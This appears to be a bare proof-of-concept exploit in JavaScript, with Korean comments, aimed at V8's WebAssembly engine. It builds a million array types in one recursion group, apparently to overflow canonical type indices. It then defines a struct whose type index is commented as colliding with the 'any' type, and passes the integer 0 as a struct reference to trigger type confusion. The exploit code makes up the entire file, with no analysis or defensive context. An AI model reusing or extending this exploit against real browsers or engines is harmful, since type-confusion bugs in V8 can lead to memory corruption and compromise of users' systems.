(async () => {
  // Task 1: Create a large number of canonicalized types
  {
    try {
      const builder = new WasmModuleBuilder();
      builder.startRecGroup();
      for (let i = 0; i < 1000000; i++) {
        builder.addArray(kWasmI64);
      }
      builder.endRecGroup();

      const buffer = builder.toBuffer();

      // WebAssembly.compile 사용 (비동기 컴파일)
      const module = await WebAssembly.compile(buffer);
      const instance = await WebAssembly.instantiate(module);
      console.log("Task 1: Instance created successfully");
    } catch (error) {
      console.error("Task 1 Error:", error.message);
    }
  }

  // Task 2: Confuse argument as struct
  {
    try {
      const builder = new WasmModuleBuilder();
      builder.startRecGroup();
      builder.addArray(kWasmI64); // Type 1000002
      builder.addArray(kWasmI64); // Type 1000003
      builder.addArray(kWasmI64); // Type 1000004
      const struct = builder.addStruct([makeField(kWasmI32, true)]); // Type 1000005 <- kAny
      const funcSig = builder.addType(makeSig([wasmRefType(struct)], [kWasmI32])); // Type 1000006
      builder.endRecGroup();

      builder
        .addFunction("read", funcSig)
        .addBody([
          kExprLocalGet,
          0,
          kGCPrefix,
          kExprStructGet,
          struct,
          ...wasmUnsignedLeb(0),
        ])
        .exportFunc();

      const buffer = builder.toBuffer();

      // WebAssembly.compile 사용 (비동기 컴파일)
      const module = await WebAssembly.compile(buffer);
      const instance = await WebAssembly.instantiate(module);

      console.log("Task 2: Instance created successfully");
      // Test the function
      console.log(instance.exports.read(0).toString(16));
    } catch (error) {
      console.error("Task 2 Error:", error.message);
    }
  }
})();
